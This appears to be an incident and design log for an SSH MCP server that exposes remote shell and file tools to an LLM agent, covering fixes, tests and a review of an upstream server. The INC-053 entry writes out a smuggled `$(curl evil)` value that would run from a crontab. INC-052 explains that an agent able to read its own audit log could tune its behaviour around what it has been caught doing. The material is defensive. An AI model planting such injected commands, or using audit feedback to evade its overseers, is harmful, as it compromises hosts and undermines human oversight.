**Test ([tests/test_upload_payload.py](tests/test_upload_payload.py)):** 7 cases pinning the validator -- plain text encodes UTF-8, unicode round-trips, empty string is allowed, binary base64 round-trips bytes verbatim, both-set raises, neither-set raises, malformed base64 raises `binascii.Error` (no silent truncation).

[TOOLS.md](TOOLS.md) rows for `ssh_upload` and `ssh_deploy` updated with the new payload semantics + an explicit "Use this instead of `ssh_exec_run` for `cat > path <<EOF` / `tee` / `echo > path` / `printf > path`" callout. SKILL.md files for both tools rewritten with both-payload examples.

Filing as Low because no security boundary was breached -- `ssh_exec_run` was always allowlist-checked + audited. The fix is observability + ergonomics: file writes via the right tool produce a structured audit line with the canonical path, and the LLM no longer has a base64 excuse to take the shell path.

Suite: 727 unit pass (up from 720), 1 skipped. Ruff clean on touched files; mypy strict adds no new errors beyond the pre-existing pattern flagged in INC-052.

### INC-053 — `ssh_cron` port deferred — upstream design unsafe to copy

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** deferred
- **Source:** internal-review (during INC-052 triage of `analyze/ssh-server-mcp-main`)
- **Refs:** [analyze/ssh-server-mcp-main/.../server-mgmt.ts:231-304](analyze/ssh-server-mcp-main/packages/ssh-server/src/tools/server-mgmt.ts#L231-L304), INC-052, INC-009, INC-015 #2, ADR-0005
- **Deferred until:** an operator asks for cron management AND the broadcast/transfer ports (INC-052) are landed and stable.

`ssh_cron` (list / add / remove) is a real ops use case (schedule a nightly cleanup, drop yesterday's debug job) but the upstream implementation has three issues we can't ship as-is:

1. **Password-as-tool-argument anti-pattern.** [server-mgmt.ts:256,271,279](analyze/ssh-server-mcp-main/packages/ssh-server/src/tools/server-mgmt.ts#L256) — `echo ${JSON.stringify(password)} | sudo -S`. Exactly the failure mode INC-015 #2 / INC-017 covered: password visible in `ps` and `/proc/<pid>/cmdline`. Our equivalent must route through `fetch_sudo_password()` per ADR-0005, sourced from `SSH_SUDO_PASSWORD_CMD` / OS keychain (INC-009).
2. **`add` is concatenation-into-shell-then-crontab.** `JSON.stringify` escapes for JSON, not shell. A command containing `$(curl evil)` lands in the crontab and runs at the scheduled time under the cron owner's UID.
3. **Remove-by-index is TOCTOU-fragile.** `crontab -l` line numbers shift if the crontab is edited (manually or by another tool) between the `list` and `remove` calls. No ID tracking, no idempotent dedupe — `add` called twice creates two identical jobs.

A sound port would look quite different: tag every added job with `# ssh-mcp:<uuid>`; list returns UUIDs; remove takes the UUID. Mutations gated `dangerous + sudo`-tier; `require_posix` (Windows scheduling is `schtasks`, totally different surface). Optional per-host `cron_command_allowlist` mirroring `command_allowlist`. Until then, `ssh_sudo_run_script` covers the use case at the cost of less ergonomics — a `ssh-cron-edit` runbook would document the recipe without locking in a bad design.

### INC-052 — Upstream tool surface comparison (`analyze/ssh-server-mcp-main`)

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** resolved (all triaged "to port" + "extend existing" items shipped; design-no decisions stand)
- **Source:** internal-review (comparison initiated by operator; upstream is a TypeScript SSH-MCP server in [analyze/ssh-server-mcp-main/](analyze/ssh-server-mcp-main/))
- **Refs:** [analyze/ssh-server-mcp-main/packages/ssh-server/src/tools/](analyze/ssh-server-mcp-main/packages/ssh-server/src/tools/), [TOOLS.md](TOOLS.md), INC-053 (cron deferral), [tools/multi_host_tools.py](src/ssh_mcp/tools/multi_host_tools.py), [tools/host_tools.py](src/ssh_mcp/tools/host_tools.py), [models/results.py](src/ssh_mcp/models/results.py)

Read all 13 upstream tool files and categorized each registration as Have / Have-different-shape / Missing-and-worth-considering / Missing-by-design. Bulk of the surface overlaps (exec / SFTP / shell / docker / systemd / journal). Triaged the deltas:

**To port (priority order):**

1. **`ssh_broadcast`** — fan-out one command across N pre-configured hosts in parallel, aggregate results. Our pool already supports concurrent acquire; the new tool is mostly orchestration + result aggregation. Each dispatched command still passes through `check_command(policy, settings)` per host, so the security model doesn't change. `dangerous + group:exec` tier; `require_posix` (could relax later if structured cross-platform aggregation matters).
2. **`ssh_transfer`** — copy a file from remote A to remote B. Two-step `download → upload` covers it today but bottlenecks at the MCP host's residential upload bandwidth; remote-to-remote SCP/SFTP routinely saturates the inter-host link (gigabit+). Implementation can either (a) open SFTP channels on both connections and pipe, or (b) issue an `scp` between the hosts via the MCP server's exec channel on A — option (a) doesn't require A to have outbound SSH to B, which is the more common firewalled topology. `low-access + group:file-ops` tier; both endpoint paths route through `canonicalize_and_check` + `check_not_restricted`.
3. **`ssh_user_info(host, username=None)`** — small structured read tool returning `{uid, gid, gecos, home, shell, groups[], primary_group}`. Backed by `id` + `getent passwd` + `groups`; no sudo needed. Drop the upstream's `list-all-users` action — `ssh_exec_run "cat /etc/passwd"` covers it once. Validate `username` against `^[a-z_][a-z0-9_-]*\$?$` up front. `safe + group:host` tier.

**Possibly port (lower priority):**

- **`ssh_snapshot` + `ssh_snapshot_diff`** — capture-and-diff system state (packages/services/ports/processes/cron/env/mounts/users). Upstream impl is fixed-command + line-set diff stored in process-local memory. Real value for deploy before/after audit, but the scope grows fast (storage backend? hostname identity? section selection per platform?). Cleanest first cut is a runbook (`ssh-snapshot-diff`) using `ssh_exec_run` calls + LLM-side diff; promote to a tool only if the runbook proves clunky.

**Extend existing rather than port:**

- **`ssh_system_info`** has 10 categories; we cover 7 via `ssh_host_info` / `ssh_host_disk_usage` / `ssh_host_processes` / `ssh_host_alerts`. Three small gaps: `cpu` (model + count), `network` (parsed `ip -j addr`), `hostname -f`. Add `cpu_model` / `cpu_count` / `hostname_fqdn` fields to `ssh_host_info`; add a separate `ssh_host_network` tool returning structured per-interface JSON. Don't port the action-enum monolith.

**Deliberately don't port (design-no):**

- **`ssh_get_logs`** — queries the MCP server's *own* audit log. Architectural call: audit must flow one-way (operator-facing). If the LLM can read its own audit log, a compromised or jailbroken LLM can self-monitor what it's been caught doing and tune around it — undermines the audit's purpose. The right interface for "search audit history" is the operator's observability stack (Loki / Splunk / Datadog / `jq`) consuming our structured JSON-lines, not an in-process tool. Multi-tenant deployments would also leak across operators. **README polish item:** add a short "querying audit logs" section with a `jq` recipe so operators know where the data goes.
- **Port forwarding** (`ssh_port_forward_local` / `_remote` / `_list` / `_remove`) — same reasoning as our recent decline of telnet transport: persistent network plumbing exposed through tool calls is a category we don't want. The audit story is built on bounded request/response, not tunnels living past tool returns. Dynamic SOCKS5 was explicitly flagged in INC-015. If anyone needs port-forwarding for legacy gear, the lower-cost path is a jump-host pattern: SSH to a bastion that already has the forwarding configured.
- **Local-FS-aware SFTP** (their `ssh_sftp_upload` / `_download` accept paths on the *MCP host's* disk). Our `ssh_upload` / `ssh_sftp_download` work with base64 content only — the MCP server never reads operator-machine files implicitly. Theirs assumes operator-trust; our threat model treats prompts as attacker-influenced.

**Architectural difference (not a gap, just different):** Theirs uses `ssh_connect → sessionId` per call (LLM connects to ad-hoc hosts at runtime). Ours uses static `hosts.toml` aliases + auto-managed pool (operator pre-declares trusted hosts in policy). Both valid; ours is the architecture that lets us layer host-blocklist + path-allowlist + command-allowlist without an operator-in-the-loop per call.

INC-053 captures the cron deferral with its specific engineering issues. Snapshot-as-runbook and the `ssh_get_logs` README polish are tracked here, not as separate INCs — promote if/when work begins.

**Resolution (2026-04-17):**

All "to port" + "extend existing" items shipped in two passes (broadcast first, then transfer + user_info + host_info extension + new host_network + audit-log README polish):

- **`ssh_broadcast`** ([tools/multi_host_tools.py](src/ssh_mcp/tools/multi_host_tools.py)) -- fan-out exec across N hosts in parallel; per-host `command_allowlist` + `platform` + transport-error gating; aliases deduplicated; hard cap of 50 hosts; pre-flight loud on `HostNotAllowed`/`HostBlocked`. Result echoes the command (audit logs broadcast as `host="?"`). 13 regression tests.
- **`ssh_transfer`** ([tools/multi_host_tools.py](src/ssh_mcp/tools/multi_host_tools.py)) -- host-to-host file copy via the MCP server. SFTP channels on both connections, 256 KiB chunked stream, atomic write on dst (temp + `posix_rename`), cleanup on mid-transfer failure. Same-host call rejected (use `ssh_cp`). Both endpoints route through `canonicalize_and_check` + `check_not_restricted` independently. Size cap from `SSH_UPLOAD_MAX_FILE_BYTES`. Cross-platform via SFTP. 7 regression tests with a fake SFTP harness covering pre-flight rejection, overwrite gating, size cap, atomic temp+rename, mid-transfer cleanup, and throughput field population.
- **`ssh_user_info`** ([tools/host_tools.py](src/ssh_mcp/tools/host_tools.py)) -- structured `/etc/passwd` row + group memberships via `getent passwd` + `id -Gn` + `id -gn` (parallel `asyncio.gather` with `return_exceptions=True` like `ssh_host_info`). `username=None` resolves the SSH user via `id -un`. Username regex-validated (POSIX 3.437) before being passed to remote argv. No sudo. Dropped the upstream's `list-all-users` action -- the structured per-user lookup is where the win is.
- **`ssh_host_network`** ([tools/host_tools.py](src/ssh_mcp/tools/host_tools.py)) -- per-interface state from `ip -j addr show`. Returns name, oper-state, MAC, addresses (family + address + prefix length). Drops kernel-internal noise. Hosts without iproute2 get an empty list rather than a raise.
- **`ssh_host_info` extended** -- added `cpu_model` (parses `/proc/cpuinfo` `model name` / ARM fallback), `cpu_count` (parses `nproc`), `hostname_fqdn` (parses `hostname -f`). Three new probes added to the existing parallel gather; each fails independently per the `return_exceptions=True` pattern. None of the new fields fabricate data when the probe fails -- they go to `None`.
- **`HostInfoResult` / `NetworkInterfaceAddress` / `NetworkInterfaceEntry` / `HostNetworkResult` / `UserInfoResult` / `TransferResult` / `BroadcastResult`** all live in [models/results.py](src/ssh_mcp/models/results.py) with `extra="forbid"` per INC-046.
- **README "Querying audit logs" section** ([README.md:438](README.md#L438)) -- documents the `ssh_mcp.audit` JSON-line schema, four `jq` recipes (errors, slowest dangerous-tier calls, count by tool, trace by correlation_id), and the explicit "hashes are dedup aids, not privacy controls" caveat.

Two traps surfaced:

1. **INC-045 footgun (`Context` import)** -- `ssh_broadcast`'s function signature put `from fastmcp import Context` under `TYPE_CHECKING` initially. FastMCP's `@tool` calls `get_type_hints()` at registration, fails with `NameError: name 'Context' is not defined`. Restored as runtime import to match the pattern pinned by per-file ruff `["TC001", "TC002"]` ignores on `tools/**`.
2. **Test helper truthiness** -- `command_allowlist or [default]` swallows `[]` (empty list is falsy in Python). Tests that wanted to disable the env allowlist (so per-host policy was the only gate) needed `is not None` instead.

[TOOLS.md](TOOLS.md) updated with rows for the four new tools + extended `ssh_host_info` description. Per-tool SKILL.md authored for each (ASCII-only per `test_skills_ascii.py`). Catalog: 71 tools across 9 groups (up from 67). Suite: 720 unit pass + 1 skipped (up from 670 / 462 pre-INC-052). Ruff clean on touched files; mypy strict adds one `attr-defined` on `asyncssh.sftp.FX_NO_SUCH_FILE` mirroring the established pattern at [low_access_tools.py:158](src/ssh_mcp/tools/low_access_tools.py#L158).

What did NOT ship from this INC and why:

- **`ssh_snapshot` + `_diff`** -- runbook-first per the original triage. Open as a future runbook rather than a tool until someone hits real friction with the `ssh_exec_run`-based ad-hoc workflow.
- **`ssh_get_logs`** (audit-log query tool) -- design-no, holds. Audit must flow one-way to operators, not back to the agent. Replaced by README documentation on `jq`-recipe self-service + structured-log shipping to observability stacks.
- **Port forwarding** (`ssh_port_forward_*`) -- design-no, holds. Persistent network plumbing exposed via tool calls is a category we intentionally don't want; bastion-jump pattern remains the recommended workaround.
- **Local-FS-aware SFTP** -- design-no, holds. `ssh_upload`/`ssh_sftp_download` continue to use base64 content rather than reading operator-machine paths.
- **`ssh_cron`** -- deferred per INC-053 with the three engineering issues from upstream (password-as-arg, shell concatenation, TOCTOU index-based remove); needs a UUID-tagged rewrite when the demand surfaces.

### INC-051 — `SSH_CONFIG_FILE` declared but never consumed (`classfang/ssh-mcp-server#22`)

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** external-issue ([github.com/classfang/ssh-mcp-server/issues/22](https://github.com/classfang/ssh-mcp-server/issues/22))
- **Refs:** [config.py:25,107-118](src/ssh_mcp/config.py#L25), [ssh/connection.py:68-78](src/ssh_mcp/ssh/connection.py#L68-L78), [lifespan.py:236-249](src/ssh_mcp/lifespan.py#L236-L249), [tests/test_ssh_config_file.py](tests/test_ssh_config_file.py)

External feature request on a sibling project asked for `~/.ssh/config` support. Cross-check revealed a doc/code drift in *this* codebase: `SSH_CONFIG_FILE: Path | None = None` was declared in [config.py:25](src/ssh_mcp/config.py#L25), surfaced in [.env.example](.env.example#L5), promised by [AGENTS.md:594](AGENTS.md#L594) ("Honor `~/.ssh/config` when `SSH_CONFIG_FILE` is set (ProxyJump, user overrides, etc.)"), echoed in [DESIGN.md:451](DESIGN.md#L451), and listed in [tests/conftest.py:26](tests/conftest.py#L26) — but the **only** consumer in the entire `src/` tree was the test conftest cleaning it out of the environment. The connect path in [_open_single](src/ssh_mcp/ssh/connection.py#L53) built kwargs purely from `HostPolicy` and never passed anything to asyncssh's `config=` parameter. Operators setting the field saw zero effect; ProxyJump/IdentityFile/host-alias from their personal SSH config were silently ignored.

**Fix (3 small edits + test):**

1. [ssh/connection.py:68-78](src/ssh_mcp/ssh/connection.py#L68-L78) — `_open_single` now appends `kwargs["config"] = [str(settings.SSH_CONFIG_FILE.expanduser())]` when the field is set. asyncssh treats config-file values as fallbacks for kwargs not explicitly passed, so our explicit `host`/`port`/`username`/`known_hosts` still win — `~/.ssh/config` only fills in fields hosts.toml omitted (most usefully `IdentityFile`, `ProxyCommand`, `Host alias → HostName real.example.com`, and `Ciphers`/`MACs`/`KexAlgorithms` for legacy gear). `expanduser()` is called explicitly because pydantic's `Path` coercion does not.
2. [config.py:107-118](src/ssh_mcp/config.py#L107-L118) — added `_empty_path_to_none` field validator. `.env.example` ships `SSH_CONFIG_FILE=` (blank); without the validator pydantic would coerce `""` to `Path("")` (truthy, points at CWD) and every connection would smuggle a bogus config path into asyncssh.
3. [lifespan.py:236-249](src/ssh_mcp/lifespan.py#L236-L249) — startup logs `ssh_config: honoring <abs-path>` when set+exists, or WARNING when set+missing. asyncssh tolerates a missing config file silently, which makes "I set the env var but ProxyJump still doesn't apply" debug sessions miserable; the explicit log line gives the operator the resolved absolute path up front. Mirrors the same pattern used for `hosts.toml` ([hosts.py:35](src/ssh_mcp/hosts.py#L35)).

**Test ([tests/test_ssh_config_file.py](tests/test_ssh_config_file.py)):** 5 tests pinning the contract — `config` kwarg appears when set, absent when unset, `~` expanded before forwarding, blank env string normalized to None, whitespace-only env string normalized to None. Pattern: monkeypatch `asyncssh.connect` with a fake that captures kwargs and raises `_StopHere` to abort before networking. 462 unit tests green; mypy strict + ruff clean on the touched files.

Filing as Medium because the field was load-bearing for any operator with non-trivial SSH client config, and the silent failure mode (no warning, no error, no effect) is exactly the class of bug INC-016/INC-019 logging was meant to surface for adjacent code paths.

### INC-050 — `bvisible/mcp-ssh-manager#16` — hardcoded `__dirname/.env` path

- **Date:** 2026-04-17 · **Severity:** N/A · **Status:** n/a (covered)
- **Source:** external-issue ([github.com/bvisible/mcp-ssh-manager/issues/16](https://github.com/bvisible/mcp-ssh-manager/issues/16))
- **Refs:** [config.py:14](src/ssh_mcp/config.py#L14), [config.py:29](src/ssh_mcp/config.py#L29), [hosts.py:34-36](src/ssh_mcp/hosts.py#L34-L36), [lifespan.py:222-230](src/ssh_mcp/lifespan.py#L222-L230)

External report against `bvisible/mcp-ssh-manager`: `index.js` builds `path.join(__dirname, '..', '.env')`, which under global npm install resolves to `node_modules/mcp-ssh-manager/.env` and never matches the user's actual `.env`. Secondary bug: `configLoader.load().then(...)` runs without `await`, so the server boots before configs finish loading and reports "No SSH server configurations found." Three failure modes total: wrong base path, race window, silent miss.

Cross-check against this codebase:

1. **Hardcoded module-relative path.** Doesn't apply. `_ENV_FILE = ".env"` ([config.py:14](src/ssh_mcp/config.py#L14)) is a bare relative string; pydantic-settings resolves it against the **process CWD**, not the package install dir. Same for `SSH_HOSTS_FILE: Path | None = Path("hosts.toml")` ([config.py:29](src/ssh_mcp/config.py#L29)) and `SSH_SKILLS_DIR` / `SSH_RUNBOOKS_DIR`. Global install via `uv tool install` / `pipx` works — the launcher's CWD is honored.
2. **Async load race.** Doesn't apply. `Settings()` instantiation is synchronous; `load_hosts(...)` ([lifespan.py:222](src/ssh_mcp/lifespan.py#L222)) is a synchronous call inside the lifespan startup before any tool registration completes. No window where the server is up but configs aren't.
3. **Silent miss.** Already mitigated. [hosts.py:35](src/ssh_mcp/hosts.py#L35) emits `logger.info("hosts.toml not found at %s; running in env-only mode", path)` with the resolved absolute path (after `expanduser`). Lifespan startup line ([lifespan.py:226-230](src/ssh_mcp/lifespan.py#L226-L230)) prints `hosts_file=<path> named_hosts=<n> allowlisted=<n>` so the operator confirms the right file even on success.

One small gap remains symmetric to their UX complaint: pydantic-settings doesn't log which `.env` it loaded (or whether it found one at all). Trivial polish — emit a `dotenv: <abs-path-or-"absent">` line at lifespan start — but not a bug. Not opening a separate INC for it; tracked here for future cleanup if anyone hits the confusion in the wild.

Filing as `N/A` rather than `resolved` because no code changed. Documented for the audit trail and to avoid re-evaluating the same external report later.

### INC-048 — `audit.py` extracts `host` from `args[0]` without type-checking

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [services/audit.py:94-103](src/ssh_mcp/services/audit.py#L94-L103), [tests/test_audit.py](tests/test_audit.py) (`test_audited_host_type_checks_args_zero`)

`audited` decorator extracted `host = kwargs.get("host") or (args[0] if args else "?")` — `args[0]` was blindly trusted to be the host string. Any tool signature that put a non-string first (Context, int, arbitrary object) would smear whatever `__repr__` landed into the audit line. **Fix (option a):** type-check both sides — `kwargs["host"]` must be `str`, `args[0]` must be `str`, otherwise fall through to the `"?"` sentinel. Kept option (a) over requiring `host` keyword-only on every tool (option b) because (b) ripples across the whole tool surface for a Low-severity audit-quality issue. A regression test `test_audited_host_type_checks_args_zero` passes a `_NotAHost()` instance with a distinctive `__repr__` as `args[0]` and asserts the audit line carries `"host": "?"`, not the repr text.

### INC-047 — Shell-session `cwd` has no async-safe update API

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [services/shell_sessions.py:38-87](src/ssh_mcp/services/shell_sessions.py#L38-L87), [tools/shell_tools.py:86-109](src/ssh_mcp/tools/shell_tools.py#L86-L109), [tests/test_shell_sessions.py:210-262](tests/test_shell_sessions.py#L210-L262)

INC-023 added `session.lock` to serialize concurrent `ssh_shell_exec` calls on the same `session_id`. The lock was correct where used but discipline-only — any caller who wrote `session.cwd = ...` without acquiring `session.lock` first would observe a torn update, no test caught a misuser, no invariant raised if the lock wasn't held. **Fix:** added `ShellSession.exec_scope()` async context manager (the one approved way to hold the lock) + `ShellSession.set_cwd(new_cwd)` method that asserts `self.lock.locked()` at the write site. `ssh_shell_exec` rewritten to use both. Any future caller that forgets the `exec_scope` wrapper trips `RuntimeError: ShellSession.set_cwd called without holding exec_scope()` in the first test run. Three new regression tests pin the behavior: `test_set_cwd_outside_exec_scope_raises` (runtime assertion), `test_set_cwd_inside_exec_scope_succeeds` (happy path), `test_exec_scope_serializes_like_raw_lock` (mirrors the INC-023 serialization invariant through the new API so refactoring the scope implementation can't silently break concurrency). Supersedes INC-027: the "bypass the lock" regression class is eliminated by construction, so the end-to-end test INC-027 worried about becomes moot. 451 unit tests green.

### INC-046 — Result models lack `extra="forbid"`; tools return dicts instead of `BaseModel`

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [src/ssh_mcp/models/results.py](src/ssh_mcp/models/results.py), [src/ssh_mcp/tools/](src/ssh_mcp/tools/), [pyproject.toml:lint](pyproject.toml)

Policy models had `ConfigDict(extra="forbid")`; result models didn't, so typos in field construction silently succeeded. Separately, most tools built a `BaseModel` and immediately called `.model_dump()` before returning — FastMCP serializes `BaseModel` directly and preserves the MCP schema, but the tools were advertising `dict[str, Any]`. Two-step fix executed in the same release window before shipping.

**Step 1 (resolved):** added `model_config = ConfigDict(extra="forbid")` to every result model in `models/results.py` (13 classes). Pulled into a module-level `_RESULT_MODEL_CONFIG` constant so a future config switch lands in one place. Construction-site typos like `HashResult(digets=...)` now raise `ValidationError` at the call site.

**Step 2 (resolved):** dropped `.model_dump()` at the tool boundaries for 22 tools that return a single typed shape:

- `host_tools`: `ssh_host_ping` → `PingResult`, `ssh_host_info` → `HostInfoResult`, `ssh_host_disk_usage` → `DiskUsageResult`, `ssh_host_processes` → `ProcessListResult`
- `sftp_read_tools`: `ssh_sftp_list` → `SftpListResult`, `ssh_sftp_stat` → `StatResult`, `ssh_sftp_download` → `DownloadResult`, `ssh_find` → `FindResult`, `ssh_file_hash` → `HashResult`
- `low_access_tools` (8): `ssh_mkdir`, `ssh_delete`, `ssh_cp`, `ssh_mv`, `ssh_upload`, `ssh_edit`, `ssh_patch` → `WriteResult`
- `exec_tools` (3): `ssh_exec_run`, `ssh_exec_script`, `ssh_exec_run_streaming` → `ExecResult`
- `sudo_tools` (2): `ssh_sudo_exec`, `ssh_sudo_run_script` → `ExecResult`

MCP clients now see typed schemas in `tools/list` instead of generic `object`. Tools that legitimately produce merged or bimodal dicts stay as `dict[str, Any]` with that intent documented at the function: every `ssh_docker_*` (extends `_run_docker`'s ExecResult dict with parsed `containers`/`events`/`volumes` keys), `ssh_shell_exec` (adds `session_id` + `cwd` to the exec payload), `ssh_host_alerts` (custom breaches/metrics), `ssh_known_hosts_verify` (custom dict), `ssh_session_list`/`_stats` (custom dict), `ssh_shell_open`/`_close`/`_list` (custom dict), `ssh_delete_folder` (bimodal: `WriteResult` payload OR `dry_run` dict), `ssh_deploy` (extends `WriteResult` with `backup_path`).

Test sweep: ~60 assertions converted from `result["field"]` to `result.field` across `tests/test_file_hash.py` and 4 e2e files (`test_e2e_real_hosts.py`, `test_e2e_path_policy.py`, `test_e2e_sudo.py`, plus a few in `test_e2e_docker.py` that were already correct). Per-file ruff ignore extended from `["TC002"]` to `["TC001", "TC002"]` on `src/ssh_mcp/tools/**` because the new return types reference first-party result models that FastMCP must resolve at runtime via `get_type_hints()` — moving them under `if TYPE_CHECKING:` would break tool registration the same way INC-045 found earlier.

**Validation:** 457 unit tests pass, ruff clean. Pydantic now catches construction typos at model build, MCP advertises real schemas, and tool bodies stop lying about their return types.

### INC-045 — Ruff `select` missing async + perf rule groups

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [pyproject.toml](pyproject.toml) `[tool.ruff.lint]`, [src/ssh_mcp/models/policy.py:1-15](src/ssh_mcp/models/policy.py#L1-L15)

Two-step fix executed in one session.

**Step 1 (cleanup):** ran `ruff check --fix` (safe + unsafe). 104 → 18 manual fixes. Manual sweep covered: 4× `E501` line-too-long (reflowed), 4× `RUF012` mutable class attrs in test stub Contexts (annotated `ClassVar[dict[str, Any]]`), 3× `B017` `pytest.raises(Exception)` (tightened to `ValidationError`), 2× `B008` (one noqa for FastMCP `Progress` DI sentinel, one moved out of default arg), 2× `SIM117` nested `with` (combined), 1× `SIM108` (ternary), 1× `RUF002` ambiguous Unicode `∪` in docstring (replaced with literal "UNION-ed"), 1× `E402` (removed redundant `import pytest as _pytest`), 1× orphan helper-import block in docker_tools facade (added `# noqa: F401` to keep test re-exports). 104 → 0.

**Step 2 (rule expansion):** added `ASYNC`/`PERF`/`PT`/`PLE`/`TCH` to `select`. Ignored `ASYNC109` globally (every tool intentionally exposes `timeout=` for per-call MCP override; project convention, not a bug) and `PT011` (`pytest.raises(ValueError)` doesn't always need `match=` — too noisy). The `--unsafe-fixes` pass for `TCH002` then moved every `from fastmcp import Context` and `from pathlib import Path` into `if TYPE_CHECKING:` blocks. **131 tests broke** because:
- FastMCP's `@mcp_server.tool` decorator calls `get_type_hints()` at registration, which evaluates string annotations against runtime globals — `NameError: name 'Context' is not defined`.
- Pydantic v2's `model_rebuild()` does the same for field annotations — `PydanticUserError: AuthPolicy is not fully defined; you should define Path`.

Fix: restored the runtime imports in 10 tool modules + `models/policy.py`, then added per-file ignores so `TCH002`/`TCH003` can't push them back: `"src/ssh_mcp/tools/**" = ["TC002"]` and `"src/ssh_mcp/models/**" = ["TC003"]`. Both per-file blocks have inline comments naming the FastMCP and pydantic gotchas so the next contributor doesn't re-run the unsafe-fix.

**Counter-evidence the new rules pull weight:** `ASYNC109` would have flagged INC-035's pattern in advance. `PT018` caught 3 composite assertions auto-fixed cleanly. `TCH001`/`TCH002`/`TCH003` correctly pushed pure-typing imports under `TYPE_CHECKING` everywhere they were safe. 457 unit tests pass, ruff clean.

### INC-044 — No CI / pre-commit / `.python-version`

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** open
- **Source:** code-review (project review)
- **Refs:** missing `.github/workflows/*.yml`, `.pre-commit-config.yaml`, `.python-version`

Project uses mypy-strict + custom ruff config + pytest marker discipline — none of it runs on PR. Any contributor (human or agent) can land regressions that pass locally because their Python version / extras / lock state differs. **Action:** scaffold a minimal GHA workflow (`ruff check` + `mypy` + `pytest` unit, matrix on Python 3.11–3.13 since `target-version = "py311"`), a pre-commit config mirroring the workflow, and a `.python-version` pinning the default local interpreter. Integration + e2e suites stay out of CI (need fixtures / live hosts).

### INC-043 — `tools/docker_tools.py` is 1016 lines; needs splitting

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [src/ssh_mcp/tools/docker_tools.py](src/ssh_mcp/tools/docker_tools.py) (facade, 103 lines), [src/ssh_mcp/tools/docker/](src/ssh_mcp/tools/docker/) (subpackage)

Split into a `docker/` subpackage with four files: `_helpers.py` (360 — regex constants, name validation, escalation deny-list `_reject_escalation_flags`, `_docker_prefix` / `_compose_prefix`, `_run_docker`, `_compose_project_op`, NDJSON parsers), `read_tools.py` (361 — 10 read-tier tools), `lifecycle_tools.py` (155 — start/stop/restart factory + `ssh_docker_cp` + 3 compose lifecycle), `dangerous_tools.py` (228 — exec, run, pull, rm, rmi, prune, compose up/down/pull). `docker_tools.py` itself becomes a 103-line facade that imports the subpackage (triggering tool registration) and re-exports every public + private name existing callers import. No tool behavior change; pure reorg.

**Monkeypatch migration:** tool bodies resolve `_run_docker` in their OWN module's namespace, so `monkeypatch.setattr(docker_tools, "_run_docker", ...)` no longer intercepts them. Two test files updated (`test_docker_events_volumes.py` → targets `read_tools`; `test_docker_top_cp.py` → targets `lifecycle_tools`) with an explanatory comment on each. Pattern documented at the top of the facade module so future contributors know where to point patches. 448 unit tests green.

### INC-042 — `_context.py` accessors use `# type: ignore[no-any-return]`

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [src/ssh_mcp/tools/_context.py](src/ssh_mcp/tools/_context.py), [src/ssh_mcp/lifespan.py:307-315](src/ssh_mcp/lifespan.py#L307-L315)

Every `pool_from` / `settings_from` / `known_hosts_from` returned `ctx.lifespan_context[<key>]` typed as `Any` with a `# type: ignore[no-any-return]` suppression. Mypy didn't narrow; no IDE hint on what keys existed. **Fix:** defined `class LifespanContext(TypedDict)` with the exact seven keys `ssh_lifespan` populates (`pool`, `settings`, `hosts`, `host_allowlist`, `known_hosts`, `shell_sessions`, `hooks`). One helper `_lifespan(ctx) -> LifespanContext` does a single `cast` — all accessors read from the narrowed view and drop the `# type: ignore`. Adding a new key now requires updating the TypedDict first (single source of truth), so lifespan ↔ accessor drift surfaces at mypy time rather than runtime. Docstring on the TypedDict explicitly names the "update here first, lifespan second" rule. mypy clean on `_context.py` + `lifespan.py`; 448 unit tests green.

### INC-041 — Unused `tenacity` dependency

- **Date:** 2026-04-17 · **Severity:** Low · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [pyproject.toml](pyproject.toml) (removed), `grep -rn tenacity src/ tests/` returns nothing

Declared `"tenacity>=8.3.0,<10.0.0"` in `[project].dependencies`, never imported anywhere. Removed; `uv sync` confirms the package uninstalled cleanly. `uv.lock` (untracked, intentional per operator note) regenerates on next sync without tenacity.

### INC-040 — `_docker_prefix` / `_compose_prefix` typed `Any`

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [tools/docker_tools.py:174-197](src/ssh_mcp/tools/docker_tools.py#L174-L197)

Helpers took `policy: Any, settings: Any`; every `docker_cmd` / `SSH_DOCKER_CMD` field access was invisible to mypy. Tightened to `HostPolicy` / `Settings` imported under `TYPE_CHECKING:` so the types are real-at-lint but no runtime cycle is introduced.

### INC-039 — `_atomic_write` catch-all swallowed `CancelledError` / `MemoryError`

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [tools/low_access_tools.py:96-101](src/ssh_mcp/tools/low_access_tools.py#L96-L101)

`except Exception:` caught and re-raised after cleanup — but it also swallowed the `asyncio.CancelledError` lifecycle (Python 3.8+ `BaseException`, but pre-3.8 `Exception`), plus real programming errors (`MemoryError`, transient OOM). Narrowed to `(asyncssh.Error, OSError)` — the actual failure surface of SFTP write + chmod + rename. Comment on the catch explains why the narrow form is correct.

### INC-038 — `asyncio.gather` without `return_exceptions=True` in host tools

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [tools/host_tools.py:73-87](src/ssh_mcp/tools/host_tools.py#L73-L87), [:134-149](src/ssh_mcp/tools/host_tools.py#L134-L149)

`ssh_host_info` parallel-gathered `uname` / `os-release` / `uptime`; one failure (e.g. `uptime` missing on minimal containers) cancelled the siblings and lost the parts we could read. Same in `ssh_host_alerts` (df / loadavg / meminfo). Added `return_exceptions=True`; failures downgrade to empty string which the parsers already treat as "unavailable". Behavior change: partial diagnostics now succeed instead of raising.

### INC-037 — `HostKeyMismatch` raised with `"<received>"` literal

- **Date:** 2026-04-17 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (project review)
